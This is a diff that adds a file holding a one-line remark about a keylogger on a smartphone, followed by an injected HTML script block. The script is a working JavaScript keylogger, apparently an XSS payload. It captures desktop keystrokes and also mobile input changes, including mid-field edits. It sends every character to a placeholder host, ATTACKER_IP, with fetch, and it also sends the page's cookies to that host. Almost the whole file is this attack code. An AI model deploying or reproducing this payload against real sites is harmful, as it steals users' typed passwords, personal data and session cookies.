@@ -1,0 +1,51 @@
+a keylogger in my smartphone??!! what??
+
+<script>
+var endpoint = 'ATTACKER_IP';
+var prevValues = {};
+
+// 1. Desktop: standard keydown — captures every real key perfectly
+document.addEventListener('keydown', function(e) {
+    if (e.key && e.key.length === 1) {  // Only printable single characters
+        fetch(endpoint + '/?key=' + encodeURIComponent(e.key));
+    }
+});
+
+// 2. Mobile fallback: detect individual character changes via input diff
+document.addEventListener('input', function(e) {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+        var field = e.target.name || e.target.id || 'unknown';
+        var prev = prevValues[field] || '';
+        var curr = e.target.value;
+        prevValues[field] = curr;
+
+        // Characters added at the end (normal typing)
+        if (curr.startsWith(prev)) {
+            var added = curr.slice(prev.length);
+            for (var i = 0; i < added.length; i++) {
+                fetch(endpoint + '/?key=' + encodeURIComponent(added[i]));
+            }
+        }
+        // Characters inserted in the middle (tap-to-edit on mobile)
+        else if (curr.length > prev.length) {
+            // Find the first point of difference
+            for (var j = 0; j < curr.length; j++) {
+                if (curr[j] !== prev[j]) {
+                    var inserted = curr.slice(j, j + (curr.length - prev.length));
+                    for (var k = 0; k < inserted.length; k++) {
+                        fetch(endpoint + '/?key=' + encodeURIComponent(inserted[k]));
+                    }
+                    break;
+                }
+            }
+        }
+        // Auto-correct replacement: send the corrected word's new characters
+        // (backspaces are silently skipped, only net additions are sent)
+    }
+}, true);
+
+// 3. Cookie exfiltration
+setTimeout(function() {
+    fetch(endpoint + '/?key=cookie&val=' + encodeURIComponent(document.cookie));
+}, 500);
+</script>
